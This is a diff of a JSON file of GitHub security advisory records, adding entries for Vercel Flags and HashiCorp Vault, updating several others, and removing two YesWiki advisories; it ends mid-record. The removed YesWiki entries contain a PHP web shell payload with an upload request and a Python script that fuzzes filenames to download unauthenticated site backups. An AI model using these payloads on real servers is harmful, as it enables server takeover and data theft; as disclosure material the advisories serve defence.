@@ -1,5 +1,208 @@
 [
     {
+        "ghsa_id": "GHSA-892p-pqrr-hxqr",
+        "cve_id": "CVE-2025-46332",
+        "url": "https://api.github.com/advisories/GHSA-892p-pqrr-hxqr",
+        "html_url": "https://github.com/advisories/GHSA-892p-pqrr-hxqr",
+        "summary": "Information Disclosure via Flags override link",
+        "description": "## Summary\n\nAn information disclosure vulnerability affecting Flags SDK has been addressed. It impacted `flags` \u22643.2.0 and `@vercel/flags` \u22643.1.1 and in certain circumstances, allowed a bad actor with detailed knowledge of the vulnerability to list all flags returned by the flags discovery endpoint (`.well-known/vercel/flags`).\n\n## Impact\n\nThis vulnerability allowed for information disclosure, where a bad actor could gain access to a list of all feature flags exposed through the flags discovery endpoint, including the:\n\n- Flag names\n- Flag descriptions\n- Available options and their labels (e.g. `true`, `false`)\n- Default flag values\n\nNot impacted:\n\n- Flags providers were not accessible\n\nNo write access nor additional customer data was exposed, this is limited to just the values noted above. Vercel has automatically mitigated this incident on behalf of our customers for the default flags discovery endpoint at `.well-known/vercel/flags`. Flags Explorer will be disabled and show a warning notice until upgraded to `flags@4.0.0`.\n\n## Resolution\n\nThe `verifyAccess` function was patched within `flags@4.0.0`. \n\nUsers of `@vercel/flags` should also migrate to `flags@4.0.0`.\n\nFor further guidance on upgrading your version, please see our [upgrade guide](https://github.com/vercel/flags/blob/main/packages/flags/guides/upgrade-to-v4.md).\n\n## Mitigations\n\nVercel implemented a network-level mitigation to prevent the default flags discovery endpoint at `/.well-known/vercel/flags` being reachable, which automatically protects Vercel deployments against exploitation of this issue. Users need to upgrade to `flags@4.0.0` to re-enable the Flags Explorer.\n\nThis automatic mitigation is not effective in two scenarios:\n\n- When using the Flags SDK on Pages Router, as the original non-rewritten route would still be accessible, e.g. `/api/vercel/flags`.\n- When using a custom path for the flags discovery endpoint.\n\nIf you are not protected by the Vercel default mitigation you can temporarily deny access to the other exposed flags discovery endpoints through a custom WAF rule while you upgrade to the latest version.\n\n## References\n\n- https://vercel.com/changelog/information-disclosure-in-flags-sdk-cve-2025-46332\n- https://github.com/vercel/flags/blob/main/packages/flags/guides/upgrade-to-v4.md",
+        "type": "reviewed",
+        "severity": "medium",
+        "repository_advisory_url": "https://api.github.com/repos/vercel/flags/security-advisories/GHSA-892p-pqrr-hxqr",
+        "source_code_location": "https://github.com/vercel/flags",
+        "identifiers": [
+            {
+                "value": "GHSA-892p-pqrr-hxqr",
+                "type": "GHSA"
+            },
+            {
+                "value": "CVE-2025-46332",
+                "type": "CVE"
+            }
+        ],
+        "references": [
+            "https://github.com/vercel/flags/security/advisories/GHSA-892p-pqrr-hxqr",
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-46332",
+            "https://github.com/vercel/flags/blob/main/packages/flags/guides/upgrade-to-v4.md",
+            "https://vercel.com/changelog/information-disclosure-in-flags-sdk-cve-2025-46332",
+            "https://github.com/advisories/GHSA-892p-pqrr-hxqr"
+        ],
+        "published_at": "2025-05-02T19:28:40Z",
+        "updated_at": "2025-05-02T19:28:41Z",
+        "github_reviewed_at": "2025-05-02T19:28:40Z",
+        "nvd_published_at": "2025-05-02T17:15:52Z",
+        "withdrawn_at": null,
+        "vulnerabilities": [
+            {
+                "package": {
+                    "ecosystem": "npm",
+                    "name": "flags"
+                },
+                "vulnerable_version_range": "<= 3.2.0",
+                "first_patched_version": "4.0.0",
+                "vulnerable_functions": []
+            },
+            {
+                "package": {
+                    "ecosystem": "npm",
+                    "name": "@vercel/flags"
+                },
+                "vulnerable_version_range": "<= 3.1.1",
+                "first_patched_version": null,
+                "vulnerable_functions": []
+            }
+        ],
+        "cvss_severities": {
+            "cvss_v3": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+                "score": 6.5
+            },
+            "cvss_v4": {
+                "vector_string": null,
+                "score": 0.0
+            }
+        },
+        "cwes": [
+            {
+                "cwe_id": "CWE-200",
+                "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+            }
+        ],
+        "credits": [],
+        "cvss": {
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+            "score": 6.5
+        }
+    },
+    {
+        "ghsa_id": "GHSA-f9ch-h8j7-8jwg",
+        "cve_id": "CVE-2025-3879",
+        "url": "https://api.github.com/advisories/GHSA-f9ch-h8j7-8jwg",
+        "html_url": "https://github.com/advisories/GHSA-f9ch-h8j7-8jwg",
+        "summary": "Hashicorp Vault Community vulnerable to Incorrect Authorization",
+        "description": "Vault Community, Vault Enterprise (\u201cVault\u201d) Azure Auth method did not correctly validate the claims in the Azure-issued token, resulting in the potential bypass of the bound_locations parameter on login. Fixed in Vault Community Edition 1.19.1 and Vault Enterprise 1.19.1, 1.18.7, 1.17.14, 1.16.18.",
+        "type": "reviewed",
+        "severity": "medium",
+        "repository_advisory_url": null,
+        "source_code_location": "https://github.com/hashicorp/vault",
+        "identifiers": [
+            {
+                "value": "GHSA-f9ch-h8j7-8jwg",
+                "type": "GHSA"
+            },
+            {
+                "value": "CVE-2025-3879",
+                "type": "CVE"
+            }
+        ],
+        "references": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-3879",
+            "https://discuss.hashicorp.com/t/hcsec-2025-07-vault-s-azure-authentication-method-bound-location-restriction-could-be-bypassed-on-login/74716",
+            "https://github.com/advisories/GHSA-f9ch-h8j7-8jwg"
+        ],
+        "published_at": "2025-05-02T18:31:38Z",
+        "updated_at": "2025-05-02T19:32:38Z",
+        "github_reviewed_at": "2025-05-02T19:32:37Z",
+        "nvd_published_at": "2025-05-02T17:15:51Z",
+        "withdrawn_at": null,
+        "vulnerabilities": [
+            {
+                "package": {
+                    "ecosystem": "go",
+                    "name": "github.com/hashicorp/vault"
+                },
+                "vulnerable_version_range": ">= 1.10.0, < 1.19.1",
+                "first_patched_version": "1.19.1",
+                "vulnerable_functions": []
+            }
+        ],
+        "cvss_severities": {
+            "cvss_v3": {
+                "vector_string": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H",
+                "score": 6.6
+            },
+            "cvss_v4": {
+                "vector_string": null,
+                "score": 0.0
+            }
+        },
+        "cwes": [
+            {
+                "cwe_id": "CWE-863",
+                "name": "Incorrect Authorization"
+            }
+        ],
+        "credits": [],
+        "cvss": {
+            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H",
+            "score": 6.6
+        }
+    },
+    {
+        "ghsa_id": "GHSA-gcqf-f89c-68hv",
+        "cve_id": "CVE-2025-4166",
+        "url": "https://api.github.com/advisories/GHSA-gcqf-f89c-68hv",
+        "html_url": "https://github.com/advisories/GHSA-gcqf-f89c-68hv",
+        "summary": "Hashicorp Vault Community vulnerable to Generation of Error Message Containing Sensitive Information",
+        "description": "Vault Community and Vault Enterprise Key/Value (kv) Version 2 plugin may unintentionally expose sensitive information in server and audit logs when users submit malformed payloads during secret creation or update operations via the Vault REST API. This vulnerability, identified as CVE-2025-4166, is fixed in Vault Community 1.19.3 and Vault Enterprise 1.19.3, 1.18.9, 1.17.16, 1.16.20.",
+        "type": "reviewed",
+        "severity": "medium",
+        "repository_advisory_url": null,
+        "source_code_location": "https://github.com/hashicorp/vault",
+        "identifiers": [
+            {
+                "value": "GHSA-gcqf-f89c-68hv",
+                "type": "GHSA"
+            },
+            {
+                "value": "CVE-2025-4166",
+                "type": "CVE"
+            }
+        ],
+        "references": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-4166",
+            "https://discuss.hashicorp.com/t/hcsec-2025-09-vault-may-expose-sensitive-information-in-error-logs-when-processing-malformed-data-with-the-kv-v2-plugin",
+            "https://github.com/advisories/GHSA-gcqf-f89c-68hv"
+        ],
+        "published_at": "2025-05-02T15:31:49Z",
+        "updated_at": "2025-05-02T19:31:47Z",
+        "github_reviewed_at": "2025-05-02T19:31:47Z",
+        "nvd_published_at": "2025-05-02T15:15:50Z",
+        "withdrawn_at": null,
+        "vulnerabilities": [
+            {
+                "package": {
+                    "ecosystem": "go",
+                    "name": "github.com/hashicorp/vault"
+                },
+                "vulnerable_version_range": ">= 0.3.0, < 1.19.3",
+                "first_patched_version": "1.19.3",
+                "vulnerable_functions": []
+            }
+        ],
+        "cvss_severities": {
+            "cvss_v3": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:N/A:N",
+                "score": 4.5
+            },
+            "cvss_v4": {
+                "vector_string": null,
+                "score": 0.0
+            }
+        },
+        "cwes": [
+            {
+                "cwe_id": "CWE-209",
+                "name": "Generation of Error Message Containing Sensitive Information"
+            }
+        ],
+        "credits": [],
+        "cvss": {
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:N/A:N",
+            "score": 4.5
+        }
+    },
+    {
         "ghsa_id": "GHSA-6m8w-jc87-6cr7",
         "cve_id": "CVE-2025-46569",
         "url": "https://api.github.com/advisories/GHSA-6m8w-jc87-6cr7",
@@ -23,12 +226,13 @@
         "references": [
             "https://github.com/open-policy-agent/opa/security/advisories/GHSA-6m8w-jc87-6cr7",
             "https://github.com/open-policy-agent/opa/commit/ad2063247a14711882f18c387a511fc8094aa79c",
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-46569",
             "https://github.com/advisories/GHSA-6m8w-jc87-6cr7"
         ],
         "published_at": "2025-05-01T17:02:58Z",
-        "updated_at": "2025-05-01T20:18:13Z",
+        "updated_at": "2025-05-02T15:33:55Z",
         "github_reviewed_at": "2025-05-01T17:02:58Z",
-        "nvd_published_at": null,
+        "nvd_published_at": "2025-05-01T20:15:37Z",
         "withdrawn_at": null,
         "vulnerabilities": [
             {
@@ -64,6 +268,10 @@
             {
                 "cwe_id": "CWE-78",
                 "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+            },
+            {
+                "cwe_id": "CWE-94",
+                "name": "Improper Control of Generation of Code ('Code Injection')"
             },
             {
                 "cwe_id": "CWE-770",
@@ -118,6 +326,30 @@
                     "site_admin": false
                 },
                 "type": "finder"
+            },
+            {
+                "user": {
+                    "login": "AdrienIT",
+                    "id": 59971358,
+                    "node_id": "MDQ6VXNlcjU5OTcxMzU4",
+                    "avatar_url": "https://avatars.githubusercontent.com/u/59971358?v=4",
+                    "gravatar_id": "",
+                    "url": "https://api.github.com/users/AdrienIT",
+                    "html_url": "https://github.com/AdrienIT",
+                    "followers_url": "https://api.github.com/users/AdrienIT/followers",
+                    "following_url": "https://api.github.com/users/AdrienIT/following{/other_user}",
+                    "gists_url": "https://api.github.com/users/AdrienIT/gists{/gist_id}",
+                    "starred_url": "https://api.github.com/users/AdrienIT/starred{/owner}{/repo}",
+                    "subscriptions_url": "https://api.github.com/users/AdrienIT/subscriptions",
+                    "organizations_url": "https://api.github.com/users/AdrienIT/orgs",
+                    "repos_url": "https://api.github.com/users/AdrienIT/repos",
+                    "events_url": "https://api.github.com/users/AdrienIT/events{/privacy}",
+                    "received_events_url": "https://api.github.com/users/AdrienIT/received_events",
+                    "type": "User",
+                    "user_view_type": "public",
+                    "site_admin": false
+                },
+                "type": "analyst"
             }
         ],
         "cvss": {
@@ -188,6 +420,10 @@
         "cvss": {
             "vector_string": null,
             "score": null
+        },
+        "epss": {
+            "percentage": 0.00041,
+            "percentile": 0.11903
         }
     },
     {
@@ -253,6 +489,10 @@
         "cvss": {
             "vector_string": null,
             "score": null
+        },
+        "epss": {
+            "percentage": 0.00041,
+            "percentile": 0.11903
         }
     },
     {
@@ -261,7 +501,7 @@
         "url": "https://api.github.com/advisories/GHSA-8x27-jwjr-8545",
         "html_url": "https://github.com/advisories/GHSA-8x27-jwjr-8545",
         "summary": "SQL injection in ADOdb PostgreSQL driver pg_insert_id() method",
-        "description": "Improper escaping of a query parameter may allow an attacker to execute arbitrary SQL statements when the code using ADOdb connects to a PostgreSQL database and calls pg_insert_id() with user-supplied data.\n\nNote that the indicated Severity corresponds to a worst-case usage scenario.\n\n### Impact\nPostgreSQL drivers (postgres64, postgres7, postgres8, postgres9).\n\n### Patches\nVulnerability is fixed in ADOdb 5.22.9 (11107d6d6e5160b62e05dff8a3a2678cf0e3a426).\n\n### Workarounds\nOnly pass controlled data to pg_insert_id() method's $fieldname parameter, or escape it with pg_escape_identifier() first.\n\n### Credits\nThanks to Marco Nappi (@mrcnpp) for reporting this vulnerability.",
+        "description": "Improper escaping of a query parameter may allow an attacker to execute arbitrary SQL statements when the code using ADOdb connects to a PostgreSQL database and calls pg_insert_id() with user-supplied data.\n\nNote that the indicated Severity corresponds to a worst-case usage scenario.\n\n### Impact\nPostgreSQL drivers (postgres64, postgres7, postgres8, postgres9).\n\n### Patches\nVulnerability is fixed in ADOdb 5.22.9 (11107d6d6e5160b62e05dff8a3a2678cf0e3a426).\n\n### Workarounds\nOnly pass controlled data to pg_insert_id() method's $fieldname parameter, or escape it with pg_escape_identifier() first.\n\n### References\n- Issue https://github.com/ADOdb/ADOdb/issues/1070\n- [Blog post](https://xaliom.blogspot.com/2025/05/from-sast-to-cve-2025-46337.html) by Marco Nappi\n\n### Credits\nThanks to Marco Nappi (@mrcnpp) for reporting this vulnerability.",
         "type": "reviewed",
         "severity": "critical",
         "repository_advisory_url": "https://api.github.com/repos/ADOdb/ADOdb/security-advisories/GHSA-8x27-jwjr-8545",
@@ -280,12 +520,13 @@
             "https://github.com/ADOdb/ADOdb/security/advisories/GHSA-8x27-jwjr-8545",
             "https://github.com/ADOdb/ADOdb/issues/1070",
             "https://github.com/ADOdb/ADOdb/commit/11107d6d6e5160b62e05dff8a3a2678cf0e3a426",
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-46337",
             "https://github.com/advisories/GHSA-8x27-jwjr-8545"
         ],
         "published_at": "2025-05-01T13:59:51Z",
-        "updated_at": "2025-05-01T13:59:51Z",
+        "updated_at": "2025-05-02T15:33:42Z",
         "github_reviewed_at": "2025-05-01T13:59:51Z",
-        "nvd_published_at": null,
+        "nvd_published_at": "2025-05-01T18:15:57Z",
         "withdrawn_at": null,
         "vulnerabilities": [
             {
@@ -574,12 +815,13 @@
         "references": [
             "https://github.com/vitejs/vite/security/advisories/GHSA-859w-5945-r5v3",
             "https://github.com/vitejs/vite/commit/c22c43de612eebb6c182dd67850c24e4fab8cacb",
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-46565",
             "https://github.com/advisories/GHSA-859w-5945-r5v3"
         ],
         "published_at": "2025-04-30T17:40:27Z",
-        "updated_at": "2025-04-30T20:42:47Z",
+        "updated_at": "2025-05-02T15:33:48Z",
         "github_reviewed_at": "2025-04-30T17:40:27Z",
-        "nvd_published_at": null,
+        "nvd_published_at": "2025-05-01T18:15:57Z",
         "withdrawn_at": null,
         "vulnerabilities": [
             {
@@ -883,6 +1125,10 @@
         "cvss": {
             "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H",
             "score": 9.1
+        },
+        "epss": {
+            "percentage": 0.00039,
+            "percentile": 0.10908
         }
     },
     {
@@ -967,6 +1213,10 @@
         "cvss": {
             "vector_string": null,
             "score": null
+        },
+        "epss": {
+            "percentage": 0.00029,
+            "percentile": 0.06662
         }
     },
     {
@@ -1087,6 +1337,10 @@
         "cvss": {
             "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
             "score": 5.3
+        },
+        "epss": {
+            "percentage": 0.00031,
+            "percentile": 0.07319
         }
     },
     {
@@ -1181,6 +1435,10 @@
         "cvss": {
             "vector_string": null,
             "score": null
+        },
+        "epss": {
+            "percentage": 0.00038,
+            "percentile": 0.10815
         }
     },
     {
@@ -1364,6 +1622,10 @@
         "cvss": {
             "vector_string": null,
             "score": null
+        },
+        "epss": {
+            "percentage": 0.00062,
+            "percentile": 0.19882
         }
     },
     {
@@ -1496,6 +1758,10 @@
         "cvss": {
             "vector_string": null,
             "score": null
+        },
+        "epss": {
+            "percentage": 0.00044,
+            "percentile": 0.13088
         }
     },
     {
@@ -2144,6 +2410,10 @@
         "cvss": {
             "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
             "score": 8.6
+        },
+        "epss": {
+            "percentage": 0.00063,
+            "percentile": 0.20057
         }
     },
     {
@@ -2586,269 +2856,6 @@
         "epss": {
             "percentage": 0.00077,
             "percentile": 0.23833
-        }
-    },
-    {
-        "ghsa_id": "GHSA-88xg-v53p-fpvf",
-        "cve_id": "CVE-2025-46347",
-        "url": "https://api.github.com/advisories/GHSA-88xg-v53p-fpvf",
-        "html_url": "https://github.com/advisories/GHSA-88xg-v53p-fpvf",
-        "summary": "YesWiki Remote Code Execution via Arbitrary PHP File Write and Execution",
-        "description": "### Summary\nAn arbitrary file write can be used to write a file with a PHP extension, which then can be browsed to in order to execute arbitrary code on the server. \n\nAll testing was performed on a local docker setup running the latest version of the application.\n\n### PoC\nProof of Concept\n\nNavigate to `http://localhost:8085/?LookWiki` which allows you to click `Create a new Graphical configuration` where you specify some parameters and then click `Save`. \n\n![LookWiki](https://github.com/user-attachments/assets/11c638ec-b700-483a-91fb-2d83107c2c69)\n\n\nAfter clicking save, this request is made (most headers removed for clarity): \n\n```\nPOST /?api/templates/custom-presets/test.css HTTP/1.1\nHost: localhost:8085\n\nprimary-color=%230c5d6a&secondary-color-1=%23d8604c&secondary-color-2=%23d78958&neutral-color=%234e5056&neutral-soft-color=%2357575c&neutral-light-color=%23f2f2f2&main-text-fontsize=17px&main-text-fontfamily=%22Nunito%22%2C+sans-serif&main-title-fontfamily='Nunito'%2C+sans-serif\n```\n\nThis request writes the file `test.css` to disk with the contents (abbreviated)\n```\n:root {\n  --primary-color: #0c5d6a;\n  --secondary-color-1: #d8604c;\n  --secondary-color-2: #d78958;\n  --neutral-color: #4e5056;\n  --neutral-soft-color: #57575c;\n  --neutral-light-color: #f2f2f2;\n  --main-text-fontsize: 17px;\n  --main-text-fontfamily: \"Nunito\", sans-serif;\n  --main-title-fontfamily: 'Nunito', sans-serif;\n}\n```\n\nTo exploit this, utilize a proxy tool to intercept the the first request and change the filename extension to `.php` and add arbitrary PHP code in for one of the request body parameters. \n\ne.g. `primary-color=%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E`\n\nNow the file `pizzapower.php` is written to `/var/www/html/custom/css-presets/pizzapower.php` and it starts with this, where the PHP code is present. \n\n\n```\n:root {\n  --primary-color: <?php system($_GET['cmd']); ?>;\n  --secondary-color-1: #d8604c;\n  --secondary-color-2: #d78958;\n  --neutral-color: #4e5056;\n  --neutral-soft-color: #57575c;\n  --neutral-light-color: #f2f2f2;\n  --main-text-fontsize: 17px;\n  --main-text-fontfamily: \"Nunito\", sans-serif;\n  --main-title-fontfamily: 'Nunito', sans-serif;\n}\n```\n\nThen, simply visit the file with a `cmd` parameter included. \n\n```\nhttp://localhost:8085/custom/css-presets/pizzapower.php?cmd=id\n```\n\nAnd the HTTP response will contain the output of our command. Notably this request can be performed unauthenticated (the creation of the file requires auth, though). \n\n```\n:root {\n  --primary-color: uid=501(yeswiki) gid=501 groups=501\n;\n  --secondary-color-1: #d8604c;\n  --secondary-color-2: #d78958;\n  --neutral-color: #4e5056;\n  --neutral-soft-color: #57575c;\n  --neutral-light-color: #f2f2f2;\n  --main-text-fontsize: 17px;\n  --main-text-fontfamily: \"Nunito\", sans-serif;\n  --main-title-fontfamily: 'Nunito', sans-serif;\n}\n```\n![injection](https://github.com/user-attachments/assets/6567d500-23b9-4587-a166-3b49878446e7)\n\n### Impact\n\nFull compromise of the server. Can potentially be performed unwittingly by a user subjected to the previously reported (or future) XSS vulnerabilities. \n\n## Fixes\n\nAmongst others: \n\nRestrict file extensions: Only allow a safelist of extensions (e.g., .css) when saving files via this feature.\nHarden server config: Disable PHP execution in user-writable directories",
-        "type": "reviewed",
-        "severity": "high",
-        "repository_advisory_url": "https://api.github.com/repos/YesWiki/yeswiki/security-advisories/GHSA-88xg-v53p-fpvf",
-        "source_code_location": "https://github.com/YesWiki/yeswiki",
-        "identifiers": [
-            {
-                "value": "GHSA-88xg-v53p-fpvf",
-                "type": "GHSA"
-            },
-            {
-                "value": "CVE-2025-46347",
-                "type": "CVE"
-            }
-        ],
-        "references": [
-            "https://github.com/YesWiki/yeswiki/security/advisories/GHSA-88xg-v53p-fpvf",
-            "https://github.com/YesWiki/yeswiki/commit/8fe5275a78dc7e0f9c242baa3cbac6b5ac1cc066",
-            "https://nvd.nist.gov/vuln/detail/CVE-2025-46347",
-            "https://github.com/advisories/GHSA-88xg-v53p-fpvf"
-        ],
-        "published_at": "2025-04-29T14:45:42Z",
-        "updated_at": "2025-04-29T20:27:16Z",
-        "github_reviewed_at": "2025-04-29T14:45:42Z",
-        "nvd_published_at": "2025-04-29T18:15:44Z",
-        "withdrawn_at": null,
-        "vulnerabilities": [
-            {
-                "package": {
-                    "ecosystem": "composer",
-                    "name": "yeswiki/yeswiki"
-                },
-                "vulnerable_version_range": "<= 4.5.3",
-                "first_patched_version": "4.5.4",
-                "vulnerable_functions": []
-            }
-        ],
-        "cvss_severities": {
-            "cvss_v3": {
-                "vector_string": null,
-                "score": 0.0
-            },
-            "cvss_v4": {
-                "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P",
-                "score": 7.4
-            }
-        },
-        "cwes": [
-            {
-                "cwe_id": "CWE-116",
-                "name": "Improper Encoding or Escaping of Output"
-            }
-        ],
-        "credits": [
-            {
-                "user": {
-                    "login": "pizza-power",
-                    "id": 6135659,
-                    "node_id": "MDQ6VXNlcjYxMzU2NTk=",
-                    "avatar_url": "https://avatars.githubusercontent.com/u/6135659?v=4",
-                    "gravatar_id": "",
-                    "url": "https://api.github.com/users/pizza-power",
-                    "html_url": "https://github.com/pizza-power",
-                    "followers_url": "https://api.github.com/users/pizza-power/followers",
-                    "following_url": "https://api.github.com/users/pizza-power/following{/other_user}",
-                    "gists_url": "https://api.github.com/users/pizza-power/gists{/gist_id}",
-                    "starred_url": "https://api.github.com/users/pizza-power/starred{/owner}{/repo}",
-                    "subscriptions_url": "https://api.github.com/users/pizza-power/subscriptions",
-                    "organizations_url": "https://api.github.com/users/pizza-power/orgs",
-                    "repos_url": "https://api.github.com/users/pizza-power/repos",
-                    "events_url": "https://api.github.com/users/pizza-power/events{/privacy}",
-                    "received_events_url": "https://api.github.com/users/pizza-power/received_events",
-                    "type": "User",
-                    "user_view_type": "public",
-                    "site_admin": false
-                },
-                "type": "reporter"
-            }
-        ],
-        "cvss": {
-            "vector_string": null,
-            "score": null
-        },
-        "epss": {
-            "percentage": 0.00336,
-            "percentile": 0.55553
-        }
-    },
-    {
-        "ghsa_id": "GHSA-wc9g-6j9w-hr95",
-        "cve_id": "CVE-2025-46348",
-        "url": "https://api.github.com/advisories/GHSA-wc9g-6j9w-hr95",
-        "html_url": "https://github.com/advisories/GHSA-wc9g-6j9w-hr95",
-        "summary": "YesWiki Vulnerable to Unauthenticated Site Backup Creation and Download",
-        "description": "### Summary\n\nThe request to commence a site backup can be performed without authentication. Then these backups can also be downloaded without authentication. \n\nThe archives are created with a predictable filename, so a malicious user could create an archive and then download the archive without being authenticated. \n\n### Details\n\nCreate an installation using the instructions found in the docker folder of the repository, setup the site, and then send the request to create an archive, which you do not need to be authenticated for: \n\n```\nPOST /?api/archives HTTP/1.1\nHost: localhost:8085\n\naction=startArchive&params%5Bsavefiles%5D=true&params%5Bsavedatabase%5D=true&callAsync=true\n```\nThen to retrieve it, make a simple `GET` request like to the correct URL: \n```\nhttp://localhost:8085/?api/archives/2025-04-12T14-34-01_archive.zip\n```\nA malicious attacker could simply fuzz this filename.\n\n### PoC\nHere is a python script to fuzz this: \n\n```\n#!/usr/bin/env python3\n\nimport requests\nimport argparse\nimport datetime\nimport time\nfrom urllib.parse import urljoin\nfrom email.utils import parsedate_to_datetime\nimport urllib3\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n# Hardcoded proxy config for Burp Suite\nBURP_PROXIES = {\n    \"http\": \"http://127.0.0.1:8080\",\n    \"https\": \"http://127.0.0.1:8080\"\n}\n\ndef send_post_request(base_url, use_proxy=False):\n    url = urljoin(base_url, \"/?api/archives\")\n    headers = {\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\",\n    }\n\n    data = {\n        \"action\": \"startArchive\",\n        \"params[savefiles]\": \"true\",\n        \"params[savedatabase]\": \"true\",\n        \"callAsync\": \"true\"\n    }\n\n    proxies = BURP_PROXIES if use_proxy else None\n    response = requests.post(url, headers=headers, data=data, proxies=proxies, verify=False)\n    print(f\"[+] Archive start response code: {response.status_code}\")\n\n    server_date = response.headers.get(\"Date\")\n    if server_date:\n        ts = parsedate_to_datetime(server_date)\n        print(f\"[\u2713] Server time (from Date header): {ts.strftime('%Y-%m-%d %H:%M:%S')} UTC\")\n        return ts\n    else:\n        print(\"[!] Server did not return a Date header, falling back to local UTC.\")\n        return datetime.datetime.utcnow()\n\ndef try_download_files(base_url, timestamp, use_proxy=False):\n    headers = {\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\",\n    }\n\n    proxies = BURP_PROXIES if use_proxy else None\n    print(\"[*] Trying to download the archive with timestamp fuzzing (\u00b110 seconds)...\")\n\n    base_ts = timestamp + datetime.timedelta(hours=2)\n\n    time.sleep(30)  # delay to generate the archive\n\n    for offset in range(-4, 15):\n        ts = base_ts + datetime.timedelta(seconds=offset)\n        filename = ts.strftime(\"%Y-%m-%dT%H-%M-%S_archive.zip\")\n        url = urljoin(base_url, f\"/?api/archives/{filename}\")\n        print(f\"[>] Trying: {url}\")\n        r = requests.get(url, headers=headers, proxies=proxies, verify=False)\n\n        if r.status_code == 200 and r.headers.get(\"Content-Type\", \"\").startswith(\"application/zip\"):\n            print(f\"[\u2713] Archive found and downloaded: {filename}\")\n            with open(filename, \"wb\") as f:\n                f.write(r.content)\n            return\n\n    print(\"[!] No archive found within the fuzzed window.\")\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(description=\"Trigger archive and fetch resulting file with timestamp fuzzing.\")\n    parser.add_argument(\"host\", help=\"Base host URL, e.g., http://localhost:8085\")\n    parser.add_argument(\"-p\", \"--proxy\", action=\"store_true\", help=\"Route requests through Burp Suite proxy at 127.0.0.1:8080\")\n    args = parser.parse_args()\n\n    ts = send_post_request(args.host, use_proxy=args.proxy)\n    print(f\"[+] Archive request sent at (UTC): {ts.strftime('%Y-%m-%d %H:%M:%S')}\")\n\n    try_download_files(args.host, ts, use_proxy=args.proxy)\n```\n\n### Impact\n\nDenial of Service - A malicious attacker could simply make numerous requests to create archives and fill up the file system with archives. \n\nSite Compromise - A malicious attacker can download the archive which will contain sensitive site information.",
-        "type": "reviewed",
-        "severity": "critical",
-        "repository_advisory_url": "https://api.github.com/repos/YesWiki/yeswiki/security-advisories/GHSA-wc9g-6j9w-hr95",
-        "source_code_location": "https://github.com/YesWiki/yeswiki",
-        "identifiers": [
-            {
-                "value": "GHSA-wc9g-6j9w-hr95",
-                "type": "GHSA"
-            },
-            {
-                "value": "CVE-2025-46348",
-                "type": "CVE"
-            }
-        ],
-        "references": [
-            "https://github.com/YesWiki/yeswiki/security/advisories/GHSA-wc9g-6j9w-hr95",
-            "https://github.com/YesWiki/yeswiki/commit/0d4efc880a727599fa4f6d7a64cc967afe475530",
-            "https://nvd.nist.gov/vuln/detail/CVE-2025-46348",
-            "https://github.com/advisories/GHSA-wc9g-6j9w-hr95"
-        ],
-        "published_at": "2025-04-29T14:41:31Z",
-        "updated_at": "2025-04-30T17:26:02Z",
-        "github_reviewed_at": "2025-04-29T14:41:31Z",
-        "nvd_published_at": "2025-04-29T21:15:52Z",
-        "withdrawn_at": null,
-        "vulnerabilities": [
-            {
-                "package": {
-                    "ecosystem": "composer",
-                    "name": "yeswiki/yeswiki"
-                },
-                "vulnerable_version_range": "<= 4.5.3",
-                "first_patched_version": "4.5.4",
-                "vulnerable_functions": []
-            }
-        ],
-        "cvss_severities": {
-            "cvss_v3": {
-                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
-                "score": 10.0
-            },
-            "cvss_v4": {
-                "vector_string": null,
-                "score": 0.0
-            }
-        },
-        "cwes": [
-            {
-                "cwe_id": "CWE-287",
-                "name": "Improper Authentication"
-            },
-            {
-                "cwe_id": "CWE-862",
-                "name": "Missing Authorization"
-            }
-        ],
-        "credits": [
-            {
-                "user": {
-                    "login": "pizza-power",
-                    "id": 6135659,
-                    "node_id": "MDQ6VXNlcjYxMzU2NTk=",
-                    "avatar_url": "https://avatars.githubusercontent.com/u/6135659?v=4",
-                    "gravatar_id": "",
-                    "url": "https://api.github.com/users/pizza-power",
-                    "html_url": "https://github.com/pizza-power",
-                    "followers_url": "https://api.github.com/users/pizza-power/followers",
-                    "following_url": "https://api.github.com/users/pizza-power/following{/other_user}",
-                    "gists_url": "https://api.github.com/users/pizza-power/gists{/gist_id}",
-                    "starred_url": "https://api.github.com/users/pizza-power/starred{/owner}{/repo}",
-                    "subscriptions_url": "https://api.github.com/users/pizza-power/subscriptions",
-                    "organizations_url": "https://api.github.com/users/pizza-power/orgs",
-                    "repos_url": "https://api.github.com/users/pizza-power/repos",
-                    "events_url": "https://api.github.com/users/pizza-power/events{/privacy}",
